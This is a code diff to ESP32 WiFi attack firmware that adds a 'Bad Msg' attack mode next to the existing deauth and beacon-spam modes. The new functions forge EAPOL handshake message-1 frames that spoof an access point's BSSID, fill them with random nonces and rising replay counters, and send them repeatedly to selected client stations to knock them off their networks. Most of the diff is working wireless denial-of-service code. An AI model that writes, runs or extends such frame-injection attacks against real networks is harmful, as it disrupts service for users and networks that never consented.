@@ -1,3 +1,4 @@
+#include "esp_random.h"
 #include "WiFiScan.h"
 #include "lang_var.h"
 
@@ -937,6 +938,10 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
     this->startWiFiAttacks(scan_mode, color, text_table4[8]);
   else if (scan_mode == WIFI_ATTACK_DEAUTH_TARGETED)
     this->startWiFiAttacks(scan_mode, color, text_table4[47]);
+  else if (scan_mode == WIFI_ATTACK_BAD_MSG_TARGETED)
+    this->startWiFiAttacks(scan_mode, color, "Bad Msg Targ");
+  else if (scan_mode == WIFI_ATTACK_BAD_MSG)
+    this->startWiFiAttacks(scan_mode, color, "Bad Msg");
   else if (scan_mode == WIFI_ATTACK_AP_SPAM)
     this->startWiFiAttacks(scan_mode, color, " AP Beacon Spam ");
   else if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_FLIPPER) || (scan_mode == BT_SCAN_ANALYZER)){
@@ -1176,6 +1181,8 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == WIFI_ATTACK_DEAUTH) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH_TARGETED) ||
+  (currentScanMode == WIFI_ATTACK_BAD_MSG_TARGETED) ||
+  (currentScanMode == WIFI_ATTACK_BAD_MSG) ||
   (currentScanMode == WIFI_ATTACK_MIMIC) ||
   (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
   (currentScanMode == WIFI_PACKET_MONITOR) ||
@@ -4115,8 +4122,9 @@ void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type
     }
   }
 
-  // We got a client possibly. Check for AP association
-  if ((snifferPacket->payload[0] != 0x80) && (wifi_scan_obj.currentScanMode == WIFI_SCAN_AP_STA)) {
+  // We got a client possibly associated with AP. Check for AP association
+  //if ((snifferPacket->payload[0] != 0x80) && (wifi_scan_obj.currentScanMode == WIFI_SCAN_AP_STA)) {
+  if ((type == WIFI_PKT_DATA) && (wifi_scan_obj.currentScanMode == WIFI_SCAN_AP_STA)) {
     #ifdef HAS_SCREEN
       display_string = CYAN_KEY;
     #endif
@@ -5508,13 +5516,14 @@ void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t typ
   String display_string = "";
   String mac = "";
 
-  if (type == WIFI_PKT_MGMT)
-  {
+  if (type != WIFI_PKT_DATA)
+    return;
+  /*{
     len -= 4;
     int fctl = ntohs(frameControl->fctl);
     const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
     const WifiMgmtHdr *hdr = &ipkt->hdr;
-  }
+  }*/
 
   char ap_addr[] = "00:00:00:00:00:00";
   char dst_addr[] = "00:00:00:00:00:00";
@@ -6413,6 +6422,119 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str
   esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
 
   packets_sent = packets_sent + 3;
+}
+
+void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6]) {
+  WiFiScan::set_channel = channel;
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  delay(1);
+
+  // Build packet
+  eapol_packet_bad_msg1[4] = mac[0];
+  eapol_packet_bad_msg1[5] = mac[1];
+  eapol_packet_bad_msg1[6] = mac[2];
+  eapol_packet_bad_msg1[7] = mac[3];
+  eapol_packet_bad_msg1[8] = mac[4];
+  eapol_packet_bad_msg1[9] = mac[5];
+
+  eapol_packet_bad_msg1[10] = bssid[0];
+  eapol_packet_bad_msg1[11] = bssid[1];
+  eapol_packet_bad_msg1[12] = bssid[2];
+  eapol_packet_bad_msg1[13] = bssid[3];
+  eapol_packet_bad_msg1[14] = bssid[4];
+  eapol_packet_bad_msg1[15] = bssid[5];
+
+  eapol_packet_bad_msg1[16] = bssid[0];
+  eapol_packet_bad_msg1[17] = bssid[1];
+  eapol_packet_bad_msg1[18] = bssid[2];
+  eapol_packet_bad_msg1[19] = bssid[3];
+  eapol_packet_bad_msg1[20] = bssid[4];
+  eapol_packet_bad_msg1[21] = bssid[5]; 
+
+  /* Generate random Nonce */
+  for (uint8_t i = 0; i < 32; i++) {
+    eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF;
+  }
+  /* Update replay counter */
+  for (uint8_t i = 0; i < 8; i++) {
+    eapol_packet_bad_msg1[41 + i] = (packets_sent >> (56 - i * 8)) & 0xFF;
+  }
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+  //esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+  //esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+
+  packets_sent = packets_sent + 1;
+}
+
+void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_str) {
+  WiFiScan::set_channel = channel;
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  delay(1);
+
+  // Build packet
+  sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
+        &eapol_packet_bad_msg1[4], &eapol_packet_bad_msg1[5], &eapol_packet_bad_msg1[6], &eapol_packet_bad_msg1[7], &eapol_packet_bad_msg1[8], &eapol_packet_bad_msg1[9]);
+  
+  eapol_packet_bad_msg1[10] = bssid[0];
+  eapol_packet_bad_msg1[11] = bssid[1];
+  eapol_packet_bad_msg1[12] = bssid[2];
+  eapol_packet_bad_msg1[13] = bssid[3];
+  eapol_packet_bad_msg1[14] = bssid[4];
+  eapol_packet_bad_msg1[15] = bssid[5];
+
+  eapol_packet_bad_msg1[16] = bssid[0];
+  eapol_packet_bad_msg1[17] = bssid[1];
+  eapol_packet_bad_msg1[18] = bssid[2];
+  eapol_packet_bad_msg1[19] = bssid[3];
+  eapol_packet_bad_msg1[20] = bssid[4];
+  eapol_packet_bad_msg1[21] = bssid[5]; 
+  
+  /* Generate random Nonce */
+  for (uint8_t i = 0; i < 32; i++) {
+    eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF;
+  }
+  /* Update replay counter */
+  for (uint8_t i = 0; i < 8; i++) {
+    eapol_packet_bad_msg1[41 + i] = (packets_sent >> (56 - i * 8)) & 0xFF;
+  }
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+
+  packets_sent = packets_sent + 3;
+}
+
+void WiFiScan::sendBadMsgAttack(uint32_t currentTime, bool all) {
+  if (!all) {
+    for (int i = 0; i < access_points->size(); i++) {
+      for (int x = 0; x < access_points->get(i).stations->size(); x++) {
+        if (stations->get(access_points->get(i).stations->get(x)).selected) {
+          //for (int s = 0; s < 20; s++) {
+            this->sendEapolBagMsg1(access_points->get(i).bssid,
+                                    access_points->get(i).channel,
+                                    stations->get(access_points->get(i).stations->get(x)).mac);
+          //}
+        }
+      }
+    }
+  }
+  else {
+    for (int i = 0; i < access_points->size(); i++) {
+      if (access_points->get(i).selected) {
+        for (int x = 0; x < access_points->get(i).stations->size(); x++) {
+          //for (int s = 0; s < 20; s++) {
+            this->sendEapolBagMsg1(access_points->get(i).bssid,
+                                    access_points->get(i).channel,
+                                    stations->get(access_points->get(i).stations->get(x)).mac);
+          //}
+        }
+      }
+    }
+  }
 }
 
 void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
@@ -7733,6 +7855,28 @@ void WiFiScan::main(uint32_t currentTime)
         display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
       #endif
       packets_sent = 0;
+    }
+  }
+  else if ((currentScanMode == WIFI_ATTACK_BAD_MSG) ||
+          (currentScanMode == WIFI_ATTACK_BAD_MSG_TARGETED)) {
+    //for (int i = 0; i < 5; i++)
+    if (currentTime - initTime >= 200) {
+      this->sendBadMsgAttack(currentTime, currentScanMode == WIFI_ATTACK_BAD_MSG);
+
+    
+      initTime = millis();
+      String displayString = "";
+      String displayString2 = "";
+      //displayString.concat(text18);
+      displayString.concat(packets_sent);
+      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
+        displayString2.concat(" ");
+      #ifdef HAS_SCREEN
+        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
+        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
+      #endif
+      //packets_sent = 0;
     }
   }
   else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
